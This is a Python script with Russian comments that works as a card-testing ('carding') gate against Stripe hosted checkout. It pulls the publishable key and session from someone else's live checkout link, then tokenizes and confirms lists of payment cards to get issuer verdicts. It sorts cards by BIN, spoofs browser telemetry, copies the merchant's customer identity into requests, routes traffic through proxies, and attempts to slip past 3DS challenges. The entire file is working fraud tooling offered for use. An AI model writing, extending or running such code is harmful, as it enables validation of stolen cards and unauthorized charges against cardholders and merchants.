# language: Python 3.12+, file: hit_gate.py, target: Windows 11, deps: curl_cffi
# Stripe Checkout /hit — проверка карты по ГОТОВОМУ cs_live-линку (hosted checkout).
# Вектор из разведки research/chat-corpus/ (docs/ИССЛЕДОВАНИЕ-НОВЫЕ-ПОВЕРХНОСТИ.md §В1):
#   cs_live-URL -> fid-фрагмент (XOR5+base64+JSON, stripe_fid.py) -> pk + session
#   -> GET /v1/payment_pages/{cs} (PI+amount+init_checksum)
#   -> POST /v1/payment_methods (токенизация)
#   -> POST /v1/payment_pages/{cs}/confirm -> вердикт эмитента
# Отличие от confirm_gate: НЕ нужен сайт-донор с pk на витрине —
# подходит любой checkout-линк (checkout.stripe.com / pay.1vpn.org / pay.opus.pro / buy.stripe.com).
import asyncio
import json
import sys
import time
import uuid

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc
import stripe_fid
import bin_steering
import frictionless_engine
import pusto_logger as _log

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


class CsHitSession:
    """Одна cs_live-сессия:fid -> pk -> PI; несколько карт, пока PI жив."""

    def __init__(self, target_url: str, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS):
        self.url = target_url.strip()
        self.max_amount = max_amount_cents
        self.s: AsyncSession | None = None
        self.pk = ""
        self.cs = ""
        self.pi_id = ""
        self.secret = ""
        self.amount = 0
        self.currency = ""
        self.checksum = ""
        self.confirms = 0
        self.customer_email = ""
        self.customer_name = ""
        self.customer_country = ""
        self.steering = bin_steering.BinSteeringEngine()

    async def open(self) -> tuple[bool, str]:
        d = stripe_fid.decode_fragment(self.url)
        self.pk = str(d.get("apiKey") or "")
        self.cs = str(d.get("checkoutSessionId") or "")
        if not self.pk.startswith("pk_live") or not self.cs.startswith("cs_"):
            return False, "не удалось извлечь pk/cs из fid-фрагмента (линк мёртв?)"
        s = AsyncSession(impersonate=config.pick_impersonate(), verify=False)
        try:
            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                            params={"key": self.pk},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://js.stripe.com/",
                                     "Accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                await s.close()
                return False, f"payment_pages HTTP {r.status_code}: {r.text[:120]}"
            data = r.json()
            if data.get("is_sandbox_merchant") or not data.get("livemode", True):
                await s.close()
                return False, "TEST_MODE (sandbox-мерчант)"
            
            # Проверяем статус сессии: если она уже завершена (complete/expired) — выходим
            sess_status = data.get("status")
            if sess_status in ("complete", "expired"):
                await s.close()
                return False, f"сессия чекаута уже {sess_status}"

            pi = data.get("payment_intent") or {}
            self.secret = str(pi.get("client_secret") or "")
            self.pi_id = str(pi.get("id") or "")
            self.amount = int(pi.get("amount") or 0)
            self.currency = str(pi.get("currency") or "").upper()
            self.checksum = str(data.get("init_checksum") or "")

            cust = data.get("customer") or {}
            self.customer_email = str(data.get("customer_email") or cust.get("email") or "")
            self.customer_name = str(cust.get("name") or "")
            self.customer_country = str((cust.get("address") or {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or "")

            status = pi.get("status")
            # Разрешаем requires_payment_method И requires_action (Stripe позволяет перезаписывать незавершенный 3DS новой картой)
            if status and status not in ("requires_payment_method", "requires_action"):
                await s.close()
                return False, f"PI status={status} — сессия не переиспользуется"

            if not self.secret and status:
                # В подписочных сессиях client_secret может отсутствовать до confirm
                pass

            if not status or self.amount == 0:
                # подписочные сессии: PI создаётся только при confirm или сумма в total_summary/invoice
                due = ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due"))
                if not due and not self.amount:
                    await s.close()
                    return False, "PI скрыт и сумма неизвестна (нестандартная сессия)"
                if due:
                    self.amount = int(due)
                self.currency = str(data.get("currency") or (data.get("invoice") or {}).get("currency") or "").upper() or "USD"

            if self.amount > self.max_amount:
                await s.close()
                return False, f"CHARGE_RISK: {self.amount}{self.currency} > {self.max_amount}c"
            self.s = s
            return True, ""
        except Exception as e:
            await s.close()
            return False, f"{type(e).__name__}: {e}"

    async def _alive(self) -> bool:
        """Проверяем, жива ли сессия (requires_payment_method / requires_action или session open)."""
        try:
            r = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                 params={"key": self.pk},
                                 headers={"Origin": "https://js.stripe.com",
                                          "Referer": "https://js.stripe.com/",
                                          "Accept": "application/json"}, timeout=12)
            data = r.json() or {}
            if data.get("status") in ("complete", "expired"):
                return False
            pi = data.get("payment_intent") or {}
            st = pi.get("status")
            if st:
                return st in ("requires_payment_method", "requires_action")
            return data.get("status") == "open"
        except Exception:
            return False

    async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
        if self.s is None:
            return {"status": "ERROR", "detail": "сессия не открыта"}
        if self.confirms >= config.MAX_CONFIRMS_PER_SECRET and not await self._alive():
            return {"status": "ERROR", "detail": "confirm-бюджет исчерпан, PI не жив"}

        # 1. 3DS Steering & Geo Enrichment
        profile = await self.steering.evaluate_card(card_raw)
        effective_a2 = bin_alpha2 or profile.country_a2 or self.customer_country

        telem = gc.stripe_telemetry(self.url, self.pk)
        if self.customer_email:
            telem["email"] = self.customer_email
        if self.customer_name:
            telem["name"] = self.customer_name
        if effective_a2:
            telem.update(gc.geo_identity_fields(effective_a2))
        card = gc.parse_card(card_raw)
        try:
            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
                                      data=gc.tokenize_body(card, telem, self.url),
                                      headers=gc.TOKENIZE_HEADERS, timeout=10)
            td = r_tok.json()
            _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
        except Exception as e:
            return {"status": "ERROR", "detail": f"tokenize: {type(e).__name__}: {e}"[:150]}
        if "id" not in td:
            err = td.get("error", {})
            _log.log_stripe("TOKENIZE_FAIL", gc.mask_pan(card_raw), str(err.get("code", "error"))[:40], str(err.get("message", ""))[:60])
            return {"status": gc.classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                    "detail": err.get("message", str(td))[:200],
                    "steering_category": profile.category.value,
                    "confidence": profile.confidence_score}
        _log.log_stripe("TOKENIZE_OK", td["id"], detail=gc.mask_pan(card_raw))
        body = {
            "key": self.pk,
            "eid": str(uuid.uuid4()),
            "payment_method": td["id"],
            "expected_payment_method_type": "card",
            "expected_amount": str(self.amount),
            "return_url": self.url.split("#")[0],
        }
        if self.checksum:
            body["init_checksum"] = self.checksum
        # подписочные сессии пересчитывают инвойс между open и confirm —
        # при checkout_amount_mismatch перечитываем сумму и повторяем один раз
        try:
            r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  data=body,
                                  headers={"Origin": "https://js.stripe.com",
                                           "Referer": "https://js.stripe.com/",
                                           "Accept": "application/json"}, timeout=20)
            resp = r.json()
            _log.log_http("POST", f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", r.status_code)
        except Exception as e:
            return {"status": "ERROR", "detail": f"confirm: {type(e).__name__}: {e}"[:150]}
        self.confirms += 1
        err = resp.get("error") or {}
        if (r.status_code in (400, 402, 409)
                and str(err.get("decline_code") or err.get("code") or "")
                    .find("amount_mismatch") >= 0):
            try:
                rg = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                      params={"key": self.pk},
                                      headers={"Origin": "https://js.stripe.com",
                                               "Referer": "https://js.stripe.com/",
                                               "Accept": "application/json"}, timeout=12)
                data0 = rg.json() or {}
                pi0 = data0.get("payment_intent") or {}
                new_amt = pi0.get("amount") or ((data0.get("total_summary") or {}).get("due")) or ((data0.get("invoice") or {}).get("amount_due"))
                if new_amt and int(new_amt) != self.amount:
                    self.amount = int(new_amt)
                    self.currency = str(pi0.get("currency") or data0.get("currency") or self.currency).upper()
                    body["expected_amount"] = str(self.amount)
                    body["eid"] = str(uuid.uuid4())
                    body["payment_method"] = td["id"]
                    r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                          data=body,
                                          headers={"Origin": "https://js.stripe.com",
                                                   "Referer": "https://js.stripe.com/",
                                                   "Accept": "application/json"}, timeout=20)
                    resp = r.json()
                    self.confirms += 1
            except Exception:
                pass
        verdict, detail = await self._classify_and_resolve_3ds(resp, profile)
        return {"status": verdict, "detail": detail[:250],
                "amount_cents": self.amount, "currency": self.currency,
                "steering_category": profile.category.value,
                "confidence": profile.confidence_score,
                "reason": profile.reason}

    async def _classify_and_resolve_3ds(self, resp: dict, profile: bin_steering.CardProfile | None = None) -> tuple[str, str]:
        """Вердикт по ответу payment_pages/confirm с проходом 3DS-ветки:
        1. Ошибки карточного уровня (402, decline) -> классификация через gate_client
        2. Успех (complete / paid / succeeded) -> APPROVED@PAID
        3. requires_action -> исполнение 3DS-Method + frictionless_engine -> 3DS_FRICTIONLESS / 3DS_CHALLENGE."""
        err = resp.get("error") or {}
        if err:
            code = (str(err.get("code") or "") + " " + str(err.get("decline_code") or "")).strip()
            msg = str(err.get("message") or "")
            return gc.classify_pi_verdict({"error": {**err, "message": f"{msg} {code}".strip()}})
        if resp.get("status") in ("complete",) or resp.get("payment_status") == "paid":
            return "APPROVED@PAID", f"checkout complete ({self.amount}{self.currency})"
        pi = resp.get("payment_intent") or {}
        pi_st = str(pi.get("status") or "")
        lpe = pi.get("last_payment_error") or {}
        if pi_st == "succeeded":
            return "APPROVED@PAID", f"PI succeeded ({self.amount}{self.currency})"
        if pi_st == "processing":
            return "PI_PENDING", "PI processing"
        if lpe:
            code = (str(lpe.get("code") or "") + " " + str(lpe.get("decline_code") or "")).strip()
            return gc.classify_pi_verdict({"error": {**lpe, "message": str(lpe.get("message") or "") + " " + code}})
        
        if pi_st == "requires_action":
            na = pi.get("next_action") or {}
            na_type = na.get("type") or ""
            
            # --- 3DS2 flow (use_stripe_sdk) ---
            if na_type == "use_stripe_sdk":
                sdk = na.get("use_stripe_sdk") or {}
                sdk_type = sdk.get("type") or ""
                stripe_js = sdk.get("stripe_js") or {}
                
                # Если уже пришёл прямой challenge от ACS (creq / acs_url) -> 3DS_CHALLENGE
                if sdk_type == "stripe_3ds2_challenge" or "acs_url" in stripe_js:
                    return "3DS_CHALLENGE", "3DS2 challenge required (OTP/SMS)"

                # Исполняем Frictionless Engine (3DS-Method iframe emulation + aligned browser telemetry)
                if self.s is not None:
                    target_cc = (profile.country_a2 if profile else "") or self.customer_country or "US"
                    f_res = await frictionless_engine.attempt_frictionless_resolution(
                        self.s, self.pk, self.cs, sdk, country_code=target_cc
                    )
                    outcome = f_res.get("outcome")
                    if outcome == "FRICTIONLESS_PASSED":
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "PASSED", f"{self.amount}{self.currency}")
                        return "APPROVED@PAID", f"3DS2 frictionless passed ({self.amount}{self.currency})"
                    elif outcome == "CHALLENGE_REQUIRED":
                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "CHALLENGE", "issuer requires OTP")
                        return "3DS_CHALLENGE", "3DS2 challenge (transStatus=C, enrolled)"
                
                # Fallback по типу SDK
                if sdk_type in ("stripe_3ds2_fingerprint", "intent_confirmation_challenge"):
                    return "3DS_CHALLENGE", f"3DS2 enrolled ({sdk_type})"
                return "3DS_REQUIRED", f"3DS SDK action (type={sdk_type or na_type})"
            
            # --- 3DS1 / Redirect flow (redirect_to_url) ---
            if na_type == "redirect_to_url":
                red_url = na.get("redirect_to_url", {}).get("url", "")
                return "3DS_CHALLENGE", f"3DS redirect challenge: {red_url[:80]}"
            
            return "3DS_REQUIRED", f"3DS action required (type={na_type})"
            
        return gc.classify_pi_verdict(resp)

    async def close(self):
        if self.s is not None:
            try:
                await self.s.close()
            except Exception:
                pass
            self.s = None


async def main():
    args = sys.argv[1:]
    proxy = None
    while "--proxy" in args:
        i = args.index("--proxy")
        if i + 1 < len(args):
            proxy = args[i + 1]
            del args[i:i + 2]
        else:
            del args[i]
    if not args or not args[0].startswith("http") or "cs_" not in args[0]:
        print("Usage: python hit_gate.py <cs_live-checkout-url> [cards...|file] [--proxy URL]")
        return
    target = args[0]
    cards = []
    import os
    for a in args[1:]:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        else:
            cards.append(a.strip())
    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] карт нет — probe: {cards[0]}")
    print("=" * 80)
    print("[*] STRIPE CHECKOUT /hit GATE (cs_live hosted checkout)")
    print(f"[*] Target: {target.split('#')[0]}")
    print(f"[*] Cards: {len(cards)} | Proxy: {proxy or 'direct'}")
    
    # Предварительная оценка и приоритизация пула карт через BinSteeringEngine
    engine = bin_steering.BinSteeringEngine()
    queue = await engine.split_queue(cards)
    _log.log_hit(f"BIN STEERING queue: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
                 f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
                 f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
                 f"{len(queue[bin_steering.ThreeDsCategory.INVALID])} INVALID")
    print("=" * 80)

    # Приоритетный порядок: DIRECT_CHECKOUT -> FRICTIONLESS -> CHALLENGE
    ordered_cards = []
    for cat in (bin_steering.ThreeDsCategory.DIRECT_CHECKOUT,
                bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE,
                bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY,
                bin_steering.ThreeDsCategory.INVALID):
        for p in queue[cat]:
            for orig in cards:
                if orig.startswith(p.pan) and orig not in ordered_cards:
                    ordered_cards.append(orig)
                    break
    cards = ordered_cards

    gs = CsHitSession(target)
    ok, detail = await gs.open()
    if not ok:
        print(f"[x] open failed: {detail}")
        return
    print(f"[+] session: {gs.pi_id} {gs.amount}{gs.currency} (confirms: {gs.confirms}/{config.MAX_CONFIRMS_PER_SECRET})")
    try:
        for i, c in enumerate(cards):
            t0 = time.perf_counter()
            res = await gs.check_card(c)
            lat = int((time.perf_counter() - t0) * 1000)
            st = str(res.get("status", "?"))
            steer_tag = f"[{res.get('steering_category', '?')[:6]}]"
            print(f">>> [{st:18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:100]}", flush=True)
            _log.log_verdict("hit", gc.mask_pan(c), st,
                             detail=str(res.get("detail", ""))[:60], latency_ms=lat)
            if st in ("SESSION_EXPIRED", "SESSION_CANCELED"):
                print(f"[!] Сессия закрыта со стороны Stripe ({st}). Дальнейшие карты не проверяются, остановка очереди.")
                _log.log_hit(f"Session terminated by Stripe: {st}. Remaining cards aborted.")
                break
            if i < len(cards) - 1:
                await asyncio.sleep(1.5)
    finally:
        await gs.close()


if __name__ == "__main__":
    asyncio.run(main())